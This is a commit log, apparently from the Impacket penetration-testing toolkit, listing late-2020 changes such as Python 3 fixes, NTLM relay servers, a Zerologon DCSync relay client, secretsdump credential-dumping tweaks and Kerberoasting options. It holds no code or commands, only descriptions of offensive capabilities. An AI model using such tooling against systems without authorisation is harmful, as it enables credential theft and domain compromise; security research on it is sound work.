    - You need to specify the masterkey needed for decryption, you can decrypt masterkeys using the masterkey command.
    - You can optionally specify an extra entropy either as a string or a binary file.

commit 4a8bd4028193db52db3f4e1407bd98ca68ee557b
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 11:45:28 2020 -0300

    And going back to dev version :)

commit 2438fb66cea4c6a9b4a04939e1ef9c4208d60134
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 10:56:07 2020 -0300

    Adjusting tag

commit 7744710e44aa1f08c85f77b54e8519daf8d59a8f
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 10:53:43 2020 -0300

    About to tag a release

commit 2708945273704d92fea00e9ac0a5fc1dc7331050
Author: JaGoTu <jagotu@gmail.com>
Date:   Thu Nov 19 12:49:30 2020 +0100

    NTLMrelayx HTTPRelayServer: Python 3.x

commit 84f00b221c55cdba6520b2f05e9148ff9f0dce92
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Nov 17 03:43:36 2020 +0300

    Speeding up DcSync

commit d1ced941eb2235ed365b13f661b1d5b4bc2683f3
Merge: d7039ed0 c95160d8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 12 14:12:02 2020 -0300

    Merge pull request #961 from Mr-Gag/master
    
    Support Docker

commit d7039ed0c90fb87a737157043e044fb68910fb8d
Merge: d7ed8dba 4b414a4f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 12 13:49:08 2020 -0300

    Merge pull request #989 from cnotin/patch-1
    
    Delete comment for myself

commit 4b414a4fd9af5438c11fbf0737fcbd801eba7126
Author: Clément Notin <clement@notin.org>
Date:   Sat Nov 7 19:47:27 2020 +0100

    Delete comment for myself
    
    Python2 compatibility was tested and implemented :)
    Sorry I forgot to clean this comment

commit d7ed8dba25315b30993279f2f4b2e8bd37298510
Merge: a31fc847 e3f44857
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 5 15:43:42 2020 -0300

    Merge pull request #938 from cnotin/patch-4
    
    Update comments

commit a31fc847d317b306d3e45be46a56429008dad432
Merge: db75c56f d28dce01
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 5 15:43:02 2020 -0300

    Merge pull request #948 from Dliv3/master
    
    Avoid cipher_list DeprecationWarning on Python3

commit db75c56f5837af3dc0e5fa8a215e84a149ea7d33
Merge: ce07da1d 2ea63630
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 5 15:42:02 2020 -0300

    Merge pull request #979 from Hackndo/ldapattack-computerscontainer
    
    Fix issue when relaying and creating computer in CN=Computers

commit ce07da1d6dd4531b02ac543d4b87ed26613a255f
Merge: 4aca7647 e5f24d1f
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 15:39:29 2020 -0300

    Merge branch 'cnotin-pr-wcfrelayserver'

commit e5f24d1f58cd96d6f7bf869bc22a1134138bca18
Merge: 4aca7647 3056fdeb
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 14:29:43 2020 -0300

    Merge branch 'pr-wcfrelayserver' of https://github.com/cnotin/impacket into cnotin-pr-wcfrelayserver

commit 4aca764741225d1078cbda9094c6cb3fe3def7ed
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 13:29:52 2020 -0300

    Replacing shebang with a virtualenv friendly one

commit da48cfe7fe0f8469c648ed31fcdda2991e59dc82
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 11:51:59 2020 -0300

    Updating installation instruction for Python 3.x

commit 094895c1e550dbf8b3339c3f85e2e8ba0cb614fe
Merge: 81eec85a 2f786181
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 10:51:30 2020 -0300

    Merge branch 'phefley-master'

commit 06cd1709b52ff9dac1c5daa63cea5016f7cc2bfe
Author: Vincent Ruello <vruello@users.noreply.github.com>
Date:   Thu Nov 5 13:18:46 2020 +0100

    Support connect timeout with SMBTransport

commit 2f786181d07db4660c7e8f00749b812380d17948
Author: root <root@localhost.localdomain>
Date:   Thu Oct 29 17:22:29 2020 -0500

    Updated to specifically delete a shadow based on ID.
    Only looks at the ntds drive for shadows.
    
            modified:   impacket/examples/secretsdump.py

commit 2ea6363006f5302f9faa2b5dc68804a02334a9fe
Author: pixis <hackndo@gmail.com>
Date:   Sat Oct 24 19:27:33 2020 +0200

    Fix issue when relaying to default CN=Computers

commit 81eec85a90201f82239c9264e4d762fd155aaf45
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 15 13:06:15 2020 -0300

    Fixing ServerChallenge default value
    
    - Reggresion introduced by https://github.com/SecureAuthCorp/impacket/commit/b923413fc8737efdb84f08a791cc655f9e5113e0
    - Should address https://github.com/SecureAuthCorp/impacket/issues/974

commit 431959ad35e7231e3603d3e464b9535fd8bad32c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 14 16:55:31 2020 -0300

    Fixed typo

commit 78a219db07400009d90c5a26cd7c7fa17e0fd493
Merge: e715bac7 3c9e17e1
Author: aconite33 <aconite33@users.noreply.github.com>
Date:   Wed Sep 30 16:24:10 2020 -0400

    Merge pull request #1 from blacklanternsecurity/missimer
    
    Missimer

commit 3c9e17e1ead48152676556c0fb8b6a6f31554c14
Author: Aconite33 <kazul33@gmail.com>
Date:   Wed Sep 30 15:54:25 2020 -0400

    Fixed typo.

commit 3f80a57a0a05725dce7eeae0e41bbede0cbac0c0
Merge: e715bac7 fe642b24
Author: Eric Missimer <eric@blsgvt.com>
Date:   Wed Sep 30 15:46:21 2020 -0400

    Merge remote-tracking branch 'original/master'

commit fe642b24be7aa870251df8a650ba1ac3bb8ef7e4
Merge: fb91eae0 501859c3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 29 15:21:57 2020 -0300

    Merge pull request #916 from mohemiv/atexec
    
    Enforcing RPC_C_AUTHN_LEVEL_PKT_PRIVACY for atexec.py

commit fb91eae0d9881ffb743edf108a6cb04ca0f80cba
Merge: ffd4a0e7 2deb6ed4
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 29 14:58:18 2020 -0300

    Merge pull request #950 from mohemiv/master
    
    Minor bug fixes

commit ffd4a0e74dbe52ef410438c16369a71370d1aa40
Merge: 65cf657f f2af5a26
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 29 14:52:37 2020 -0300

    Merge pull request #963 from vbersier/master
    
    Fix Exception when splitting request bytes string in samba server

commit f2af5a2699fddaace217dab204985895e9b7084d
Author: Valentin Bersier <vbersier@gmail.com>
Date:   Tue Sep 29 15:27:48 2020 +0200

    Fixed superfluous unhexlify in `setSMBChallenge`

commit 7b472b7e9602803640109ade751540907a581323
Author: Valentin Bersier <vbersier@gmail.com>
Date:   Tue Sep 29 11:08:53 2020 +0200

    Fix Exception when splitting request binary string in samba server

commit c95160d8f067b89decbd2c382861f013488f2163
Author: yassine birig <gobirig@gmail.com>
Date:   Sun Sep 27 00:12:08 2020 +0100

    change link

commit 326f13f7577e535fd4e2df5b803285c825e72a21
Author: yassine birig <gobirig@gmail.com>
Date:   Sun Sep 27 00:04:45 2020 +0100

    modifiy README add Docker build and usage"

commit 01ddba846fe2ce90eb454d54091e95e8ce5c797e
Author: yassine birig <gobirig@gmail.com>
Date:   Sat Sep 26 23:55:53 2020 +0100

    add Docker file

commit 65cf657f00ba36ea9396be263007e08b4d71f3c1
Merge: 02d65e14 63eb977d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Sep 24 18:33:26 2020 -0300

    Merge pull request #959 from dirkjanm/dcsyncrelay
    
    Zerologon dcsync relay client

commit 63eb977dc9c817216d82a48adceaff07d12fb83f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Sep 24 21:59:14 2020 +0200

    py2 fix and small cleanup

commit a7537124f44f5f8b1abc63dfcf17025f307c3ce2
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Sep 24 21:40:52 2020 +0200

    dcsync relay client

commit 02d65e149c60ac619e7946661bb1c7344bee2f75
Merge: 84c8d6a7 865f4e03
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Sep 24 09:55:15 2020 -0300

    Merge pull request #901 from ABCIFOGeowi40/master
    
    Fixed dcomrt.py MinorVersion Problem

commit 84c8d6a7490fb4a1319d83d614b53552656cc6d0
Merge: ba6cc81d a79c6032
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 21 17:50:10 2020 -0300

    Merge pull request #957 from dirkjanm/guestauth
    
    skip target selection for anonymous auth

commit a79c6032bc09f5f6b23bfd70ffb86ca7f385bdae
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 21 20:59:58 2020 +0200

    actually that should be the original smb1 command

commit d04091efaf10e8348534860c6a59ac0c44c00c32
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 21 20:56:49 2020 +0200

    skip target selection for anonymous auth

commit ba6cc81d35aa38e1c36588a347cd1f0d7386e6e4
Merge: 7ed645aa 2860ab9d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 21 15:03:15 2020 -0300

    Merge pull request #956 from dirkjanm/cleanupfix
    
    Small fix in secretsdump cleanup

commit 2860ab9d374d1fc480f54e4677ee7a5872b46ed7
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 21 19:02:33 2020 +0200

    don't initiate a new connection if there is nothing to clean

commit 7ed645aad5542637cb1e06af0db209473e38c35a
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 21 12:23:26 2020 -0300

    Fixing SMB1 relay behaviour
    
    - relayToHost variable should be cleared after succesfull relay.
    - Fixes https://github.com/SecureAuthCorp/impacket/issues/954

commit b7288fddc28c99d9d95a6c053e4f957b43c359d4
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Wed Sep 16 22:13:41 2020 +0300

    Edit new password verification part

commit ad600a098a1e9e65309995c202f118512a568667
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Wed Sep 16 22:08:40 2020 +0300

    Show RPC dump if non-zero code returned

commit 78e8c8e41b3f163f1271a01ce3f2bf3bb880f687
Merge: 81d44893 1397e2b5
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 15 11:52:25 2020 -0300

    Merge branch 'dirkjanm-plaintext-machine2'

commit 1397e2b52f3aa238fda32c93a48c1bcb1eeacba7
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Sep 15 16:00:06 2020 +0200

    change default secretsdump behavior to also dump plaintext machine account password

commit 81d44893a464e406bd9e97e0d54012225546a2b5
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 16:20:22 2020 -0300

    Fixing minor Python3 compatibility
    
    - Related to https://github.com/SecureAuthCorp/impacket/pull/951

commit b867b21de5fcfd48686a04487e1ef83c2d1b5e47
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 16:06:00 2020 -0300

    Setting ClearNewPassword field as a general fixed array
    
    - So you can encrypt the NL_TRUST_PASSWORD struct yourself and put the result in there.
    - Related to https://github.com/SecureAuthCorp/impacket/pull/951

commit 64ce46580286b5ab15a4737bddf85201ce2adde3
Merge: 15f3df26 0bd850c3
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 13:13:46 2020 -0300

    Merge branch 'dirkjanm-NetrServerPasswordSet2'

commit 0bd850c3ed53b56d1a13b126b6839bbf5e019076
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 13:13:14 2020 -0300

    Adding NetrServerPasswordSet2 and hNetrServerPasswordSet2 test cases

commit 11a2fe4bac60583c85ede4591b8551cec2165ee0
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 13:12:33 2020 -0300

    Minor adjustments on NetrServerPasswordSet2 definition
    
    - Added hNetrServerPasswordSet2 helper method

commit 052a849caa0dd7db80bbc0b4fd157862287246ce
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 14 15:22:23 2020 +0200

    some netlogon structs for NetrServerPasswordSet2

commit 2deb6ed449957ded7ba3ae63d06b43036a62a4c6
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sat Sep 12 00:33:14 2020 +0300

    Fixing store_true default value

commit 15f3df268493996512a600e722f82dfd63eae966
Merge: aab83f8c 4aaae185
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 9 15:07:38 2020 -0300

    Merge branch 'ptswarm-spns'

commit 4aaae1854f16994b84f6530991a24d381073303f
Merge: aab83f8c 2d874dc9
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 9 15:05:49 2020 -0300

    Merge branch 'spns' of https://github.com/ptswarm/impacket into ptswarm-spns

commit aab83f8c91ab3c535581bc0034a317786be54a60
Merge: d84fca22 3b2b8192
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 9 14:01:21 2020 -0300

    Merge pull request #949 from cnotin/patch-1
    
    Remove superfluous UTF16 encoding

commit 3b2b81922c18a58a6bc1bfee6a5051ff2cd26c48
Author: Clément Notin <clement@notin.org>
Date:   Tue Sep 8 18:11:14 2020 +0200

    Remove superfluous UTF16 encoding
    
    It's already a string and it gives an ugly UTF16 output when using --enum-local-admins (and only on the first part which is the domain)

commit d28dce018664928abb3752509ad00518ae73f67e
Author: Dliv3 <dddliv3@gmail.com>
Date:   Tue Sep 8 14:34:35 2020 +0800

    Avoid cipher_list DeprecationWarning on Python3

commit d84fca225175729bdf215adca10f3b3bd5a84733
Merge: 80aaf63a cca78f39
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 7 11:27:04 2020 -0300

    Merge pull request #945 from cclauss/Python3.8
    
    Travis CI: Add Python 3.8 to the testing (again)

commit cca78f3964ba75f3e7be85e68ac1b0733164da06
Author: cclauss <cclauss@me.com>
Date:   Mon Sep 7 15:57:25 2020 +0200

    Travis CI: Add Python 3.8 to the testing (again)

commit 80aaf63ac8d1a1458b51971e75a0450bb381237d
Merge: dd5e3d9c 0535ef79
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 10:19:34 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 0535ef793c7ab7e66c46e2acb06fd5b07196d731
Merge: ad99ae74 ae21fb10
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 7 10:19:28 2020 -0300

    Merge pull request #928 from franferrax/master
    
    Introduce the [MS-NLMP] 2.2.2.10 VERSION structure in NTLMAuthNegotiate messages

commit dd5e3d9c6fa14c561c03b315e6c39ddbb82acc01
Merge: 29b7e15e ad99ae74
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 10:18:09 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit ad99ae74ca830f0c4c691b8d8e149274efb3970a
Merge: d55c1c8c 1347a81d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 7 10:17:43 2020 -0300

    Merge pull request #931 from cclauss/patch-3
    
    Avoid SyntaxWarning on Python >= 3.8

commit 3056fdeb33bee9e9b76c47b9faba13080c2841e3
Author: Clément Notin <clement@notin.org>
Date:   Sun Sep 6 17:49:28 2020 +0200

    WCFRelayServer: add Py2 compat

commit 53300f71fe2dda5f5997a67dc5f51aacfdddce35
Author: Clément Notin <clement@notin.org>
Date:   Wed Sep 2 23:33:54 2020 +0200

    WCFRelayServer for ntlmrelayx implementing WCF NetTcpBinding / ADWS

commit 55e47713325c5a0f505eb6c03bab95bceea8cfde
Author: Clément Notin <clement@notin.org>
Date:   Sun Sep 6 16:19:08 2020 +0200

    Use SPNEGO_NegTokenResp to craft packet instead of raw binary

commit c3da54aeaca05c95ccdd26565a81ca47de7dc88d
Author: Clément Notin <clement@notin.org>
Date:   Fri Sep 4 01:18:31 2020 +0200

    SPNEGO_NegTokenResp is specified with "NegState" and not "NegResult"

commit 29b7e15e1357ace933cc3ee415c4f65bc8b8a97b
Merge: 5ea69aed d55c1c8c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:53:54 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit d55c1c8c4fa0022fd1ef5d1447ed94e1c0cfc73b
Merge: fed64924 8d2d5543
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:53:38 2020 -0300

    Merge pull request #939 from cnotin/patch-5
    
    Catch DistributionNotFound exception when trying to get version number and package not installed

commit 5ea69aed7a48dccc7e9d6019b787dfbf03026c00
Merge: 2fbf2d65 fed64924
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:53:12 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 2fbf2d655472e98a192744dc8894b527fee57621
Merge: 0d0f43cc 5b226028
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:53:03 2020 -0300

    Merge branch 'cnotin-patch-5'

commit 0d0f43cccf140c0a991a194397a1b26cc4a65b09
Merge: fd736bb9 8d2d5543
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:51:44 2020 -0300

    Merge branch 'patch-5' of https://github.com/cnotin/impacket

commit 8d2d554368b7cbe96e66dd83409de02fdb28b27f
Author: Clément Notin <clement@notin.org>
Date:   Fri Sep 4 20:44:24 2020 +0200

    Add instruction to run "setup.py egg_info" when DistributionNotFound

commit 5b226028b6b2bdadc800a284b9a44f2fb5c692b1
Merge: fd736bb9 7c9c9975
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:19:17 2020 -0300

    Merge branch 'patch-5' of https://github.com/cnotin/impacket into cnotin-patch-5

commit fed64924e537c4a655271b98c98454fe4c9ee28b
Merge: fd736bb9 ceb721a7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:13:17 2020 -0300

    Merge pull request #940 from cnotin/pr-exception-subscriptable
    
    Fix "exception is not subscriptable" error

commit fd736bb99baf41aabcb6ab1a347c791f5406fb1d
Merge: 4ef274de 59c8e122
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:08:42 2020 -0300

    Merge branch 'cnotin-patch-3'

commit 59c8e1222b124f313ade8550e9780f810c883549
Merge: 4ef274de ea6d2550
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:08:07 2020 -0300

    Merge branch 'patch-3' of https://github.com/cnotin/impacket into cnotin-patch-3

commit 4ef274dea737d4ad8e1ac53ae56a45e0e87f741f
Merge: 1f507965 e6dfad9e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:05:14 2020 -0300

    Merge pull request #936 from cnotin/patch-2
    
    SOCKS HTTP plugin: fix bytes encoding issues

commit 1f507965525bb2e94284de311ff3c9674f98e5af
Merge: 3c32a77f ab24690e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:03:47 2020 -0300

    Merge pull request #935 from cnotin/patch-1
    
    Convert b64encode from bytes to str to fix NTLM content in HTTP header

commit ceb721a76805dca64e38e14a20a9d8b92e4c3882
Author: Clément Notin <clement@notin.org>
Date:   Fri Sep 4 00:12:46 2020 +0200

    Properly detect when SMB negotiation failed due to ConnectionResetError
    
    We don't get the "socketerror" anymore as nmb.py catches it, retries and finally throws a generic Exception. See https://github.com/SecureAuthCorp/impacket/blob/3c32a77fe82be1e34bc78e89c92b1d25fe3f5d96/impacket/smbconnection.py#L186-L188

commit a613e27c0f69b4b4d03c4149a73632b3cfbaca80
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 23:58:01 2020 +0200

    Fix "exception is not subscriptable" error
    
    ex.errno is the way to get the exception "errno" in Python 2 and 3
    Fixes #934

commit 7c9c99756be6410d9528142cdc7c324938ea120c
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 23:34:10 2020 +0200

    Catch DistributionNotFound exception when trying to get version number and package not installed
    
    For example when running it for development in an IDE

commit e3f448576b8ba964490b318f7f4e69dfd534b69a
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 20:12:47 2020 +0200

    Update comments

commit ea6d25500f66c4271d8d380731694ee210d063d0
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 18:55:28 2020 +0200

    ntlmrelayx: "isinstance" needs a tuple of types, not a list

commit e6dfad9eebb0b9adc8ef2e7cb149f572203475e2
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 18:36:31 2020 +0200

    SOCKS HTTP plugin: fix bytes encoding issues

commit ab24690e9df3b6d285e72207b56052faee0cf273
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 16:43:46 2020 +0200

    Convert b64encode from bytes to str to fix NTLM content in HTTP header

commit 3c32a77fe82be1e34bc78e89c92b1d25fe3f5d96
Merge: 65ed4a71 48c43f42
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 2 14:05:02 2020 -0300

    Merge pull request #933 from 5alt/master
    
    Fix reading binary file error while using custom exe file

commit 65ed4a713a397c4895cc4c0f41f05a221c2a07e7
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 2 13:06:55 2020 -0300

    Adding win32 constrain to pyreadline

commit 1347a81df0327d325ea3efd99354d73a38dbd1b6
Author: Christian Clauss <cclauss@me.com>
Date:   Wed Sep 2 15:30:39 2020 +0200

    Travis CI: Fix build config validation issues

commit 48c43f42b4d9639e0261338a1e0969306a1306fb
Author: 5alt <md5_salt@qq.com>
Date:   Wed Sep 2 14:50:55 2020 +0800

    Fix SMB error when using port 139
    
    Remove SMBv3 in negoData

commit 6c7229fccbdf2367e4188d034d831a389e401206
Author: 5alt <md5_salt@qq.com>
Date:   Wed Sep 2 13:29:05 2020 +0800

    Fix reading binary file error while using custom exe file
    
    Replace all `open(self.__exeFile)` to `open(self.__exeFile, 'rb')`

commit 9689c75fa4bb052f17c9d1ca1140c97987cb694b
Author: Clément Notin <clement@notin.org>
Date:   Tue Sep 1 23:56:49 2020 +0200

    Add pyreadline requirement

commit 7532caabc72eaac279de6a001d227f7d14c744c8
Author: Christian Clauss <cclauss@me.com>
Date:   Thu Aug 27 21:26:51 2020 +0200

    Avoid SyntaxWarning on Python >= 3.8
    
    Avoid [SyntaxWarnings on Python >= 3.8](https://docs.python.org/3/whatsnew/3.8.html#porting-to-python-3-8).
    
    % `python3.8`
    ```
    >>> "" is ""
    <stdin>:1: SyntaxWarning: "is" with a literal. Did you mean "=="?
    ```

commit 9485b0c25eb634774da4fda133ed57218a36aceb
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 10:19:17 2020 -0300

    Adding -ntlmchallenge parameter
    
    * Allows to specify the NTLM Server Challenge used when receiving a connection.
    * Addresses https://github.com/SecureAuthCorp/impacket/issues/927

commit b923413fc8737efdb84f08a791cc655f9e5113e0
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 10:00:08 2020 -0300

    Fix for exception inside outputToJohnFormat when logging SMBv1 Standard Security hashes
    
    * Small fix on how to store the server challenge as well.

commit 63e7fdfb380f00588eca6697124c68c81ec7c373
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 20:59:29 2020 +0300

    Update example

commit 016551329e03f0f74ea2e977954db8f6906ecb8e
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 13:52:49 2020 +0300

    Add forgotten imports

commit 78308c85a60e57456329bd178a882f1278d93853
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 13:38:11 2020 +0300

    Change arguments format

commit 550f2d47ff6a718a1ab33145deb85d441f8d5dbe
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 13:36:24 2020 +0300

    Add exception handling

commit ae21fb10b06c119ca7b7421f89b10e995a4f8e14
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:57:25 2020 -0300

    Implement test cases for acd32c6 & 74e085e changes

commit cce94ae754faa86057cfd1e44914cf00a283b52b
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:54:57 2020 -0300

    Remove no longer valid warning message
    
    After 46ebcfb changes, aTime is automatically set depending on the ntlm.TEST_CASE variable value, so this warning is outdated

commit 74e085eecd1af3ef478a045e6c65c812ae41934d
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:54:04 2020 -0300

    Remove unused/dead code: NTLMAuthMixin

commit acd32c6d275c1fd22eda4c3bc0170f51be9dbb07
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:53:28 2020 -0300

    Introduce the [MS-NLMP] 2.2.2.10 VERSION structure for NTLMAuthNegotiate
    
    More info: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b1a6ceb2-f8ad-462b-b5af-f18527c48175

commit b5fa089b058b097037efd79760d71bae39524948
Merge: 257dc19c fdc6c935
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 17:06:51 2020 -0300

    Merge branch 'ptswarm-exchanger'

commit fdc6c935de27ae94b06d697ccc2890bb519ef62b
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 16:59:48 2020 -0300

    Fix ArgumentParser.add_subparser 'required' argument Python version supported.
    
    - required is supported in Python 3.7+

commit 1573f7b9cc4980235b8e08c446fd0ed9c6cf47a3
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 12:43:46 2020 -0300

    Fixing test case for Python 3.6

commit f0e847d7e801116fb4e8698f6f0226de628e7bdd
Merge: 257dc19c 8baf5596
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 11:46:13 2020 -0300

    Merge branch 'exchanger' of https://github.com/ptswarm/impacket into ptswarm-exchanger

commit 257dc19c7fdb36fea558872487ca0bfed324276e
Merge: 9c621a7d 3ec59074
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 19 11:45:26 2020 -0300

    Merge pull request #922 from rmaksimov/fix-des-padding-bug
    
    fix DES-CBC-MD5 padding bug

commit 9c621a7dd0872918239d9f2aa943e3f2dd40e7c3
Merge: 1c893884 d8359e6f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 19 09:51:36 2020 -0300

    Merge pull request #921 from rmaksimov/bug-krb-etype-switching
    
    fix issue with switching to RC4

commit 3ec59074ec35c06bbd4312d1042f0e23f4a1b41f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Aug 19 03:16:26 2020 +0300

    fix DES-CBC-MD5 padding bug

commit d8359e6fa0e1d41f925ad8a0708f0c891db13144
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Aug 19 01:21:43 2020 +0300

    fix issue with switching to RC4

commit 963508ecf14d1b8927f388531f18dfe762290760
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Aug 14 15:51:42 2020 +0300

    Add smbpasswd.py script

commit 1c893884e6aef29c4dcaac7f9fbb30f631b30dc5
Merge: 110b886c be64aa28
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 13 22:19:56 2020 -0300

    Merge pull request #883 from spinenkoia/fix_hElfrReadELW_seek
    
    dcerpc: replace default readFlags to EVENTLOG_SEEK_READ #882

commit 2d874dc91715b6c8708e2158dc7e3108ed0deb04
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Aug 10 01:48:58 2020 +0300

    Changing SANs in the output to the Impacket format

commit 872ac0e29a91c10778f1686e7f31489f53d268d1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Aug 10 01:17:36 2020 +0300

    Changing SPNs to SANs in GetUserSPNs.py as it's more reliable

commit c2837a135cf5c2ae180098bcf4ed19e50736bafb
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Aug 10 00:24:53 2020 +0300

    Adding -usersfile flag to GetUserSPNs.py
    
    * Added -usersfile flag to GetUserSPNs.py
    * Handling of -usersfile flag in GetNPUsers.py is moved higher to skip unnecessary connections to SMB (BTW, it's weird that the script connects to SMB in Kerberoasting)

commit bbae145c1f8dde45fff7958e3c3cef8d1445f6f1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Aug 9 23:50:35 2020 +0300

    Changing sizeLimit in GetUserSPNs.py

commit 336ee45c9ddae2f2430e77768fde6d2d0f921ba3
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sun Aug 9 23:47:07 2020 +0300

    Adding new Principal Name Types

commit 110b886c2d8de880d891da5914827ad9df1bc024
Merge: 48a3124c 919055c0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Aug 4 14:53:12 2020 -0300

    Merge pull request #915 from mohemiv/ndr-bugfixes
    
    NDR Parser Optimization Bugfixing

commit 501859c398b4088e76140bf89a19d632625ac9cd
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Aug 4 20:49:55 2020 +0300

    Enforcing RPC_C_AUTHN_LEVEL_PKT_PRIVACY for atexec.py

commit 919055c0fe734fd324a0291c06a8a36dfe869f18
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Aug 4 20:21:13 2020 +0300

    Fixing a bug appeared after the optimization of NDR parser

commit 8baf55962a654c1a1ed459a5e0419b898248c711
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 30 18:02:05 2020 +0300

    Fixing Travis CI tests

commit b97fdef3daafc2a3b736cfe4cfe5712d81f1be96
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Jul 30 17:41:52 2020 +0300

    Adding tests for MS-RPCH

commit 207a6f8b0f14a7572d190e6afc89ab42907c398b
